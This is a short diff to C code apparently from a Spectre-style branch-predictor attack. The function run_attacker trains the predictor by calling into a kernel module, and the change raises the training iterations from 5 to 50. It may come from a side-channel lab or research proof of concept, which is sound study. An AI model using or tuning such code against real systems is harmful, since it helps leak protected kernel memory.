@@ -58,7 +58,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         for (int attempt = 0; attempt < 200; attempt++) {
 
             // 1. TRAIN branch predictor
-            for (int i = 0; i < 5; i++) {
+            for (int i = 0; i < 50; i++) {
                 call_kernel_part2(kernel_fd, shared_memory, i % 8);
             }
 
